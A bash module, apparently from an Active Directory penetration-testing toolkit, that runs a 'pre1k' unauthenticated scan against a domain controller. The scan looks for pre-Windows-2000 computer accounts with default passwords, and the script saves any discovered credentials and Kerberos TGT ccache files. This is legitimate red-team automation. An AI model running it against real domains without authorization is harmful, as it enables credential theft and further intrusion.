#!/usr/bin/env bash
set -uo pipefail

# Source utility functions and config files from module.sh
source "${SCRIPT_DIR}/lib/module.sh"

# Ensure required environment variables are set
validate_env_vars "AD_DOMAIN" "DC_IP" "RECON_DIR" "TOOLS_DIR" "CREDS_DIR"

# Define file paths
DNS_FILE="${RECON_DIR}/DNS.txt"
PRE2K_OUTPUT="${CREDS_DIR}/pre1k_unauth.txt"

# Check if DNS file exists, otherwise generate it
if [[ ! -s "${DNS_FILE}" ]]; then
    info "DNS file not found. Generating DNS file using run_get_DNS..."
    "${SCRIPT_DIR}/modules/run_get_dns.sh"
    if [[ ! -s "${DNS_FILE}" ]]; then
        fail "Failed to generate DNS file. Exiting."
        exit 1
    fi
fi

info "Running Pre1k unauthenticated scan for domain: ${AD_DOMAIN}, DC IP: ${DC_IP}..."
python3 "${TOOLS_DIR}/pre1k-TS/pre1k.py" unauth \
    -d "${AD_DOMAIN}" \
    -dc-ip "${DC_IP}" \
    -inputfile "${DNS_FILE}" \
    -save \
    -verbose \
    -outputfile "${PRE2K_OUTPUT}"

if [[ $? -ne 0 ]]; then
    fail "Pre1k unauthenticated scan failed."
    exit 1
fi

info "Pre1k scan completed. Output saved to ${PRE2K_OUTPUT}."

# Save any TGT (Ticket-Granting Tickets) found
info "Checking for .ccache files to save TGTs..."
for ccache_file in ./*.ccache; do
    if [[ -f "${ccache_file}" ]]; then
        "${SCRIPT_DIR}/modules/saveTGT.sh" "${ccache_file}"
    fi
done

success "Pre1k unauthenticated scan completed successfully."
